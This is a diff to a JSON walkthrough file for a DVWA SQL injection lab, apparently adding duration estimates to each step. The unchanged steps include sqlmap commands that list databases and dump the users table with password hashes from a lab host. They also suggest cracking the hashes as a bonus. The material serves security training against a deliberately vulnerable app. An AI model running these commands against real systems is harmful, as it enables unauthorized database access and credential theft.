@@ -12,7 +12,8 @@
       "title": "Access DVWA in browser",
       "command": "curl -I http://172.20.0.10",
       "explanation": "First, verify DVWA is running. Then open http://localhost:8080 in your browser.",
-      "expected": "HTTP/1.1 302 Found (redirect to login)"
+      "expected": "HTTP/1.1 302 Found (redirect to login)",
+      "duration": "1-2 sec"
     },
     {
       "title": "Login to DVWA",
@@ -51,13 +52,15 @@
       "title": "Use SQLMap for automation",
       "command": "sqlmap -u 'http://172.20.0.10/vulnerabilities/sqli/?id=1&Submit=Submit' --cookie='PHPSESSID=YOUR_SESSION_ID;security=low' --dbs",
       "explanation": "SQLMap automates SQL injection. Replace YOUR_SESSION_ID with your actual session cookie from the browser (F12 > Application > Cookies).",
-      "expected": "SQLMap finds the vulnerability and lists databases"
+      "expected": "SQLMap finds the vulnerability and lists databases",
+      "duration": "30-60 sec"
     },
     {
       "title": "Dump the users table",
       "command": "sqlmap -u 'http://172.20.0.10/vulnerabilities/sqli/?id=1&Submit=Submit' --cookie='PHPSESSID=YOUR_SESSION_ID;security=low' -D dvwa -T users --dump",
       "explanation": "This extracts all data from the users table, including password hashes.",
-      "expected": "Full user table with cracked passwords"
+      "expected": "Full user table with cracked passwords",
+      "duration": "1-2 min"
     }
   ],
   "success_criteria": "You can extract usernames and password hashes using manual SQLi or SQLMap. Bonus: crack the hashes!",
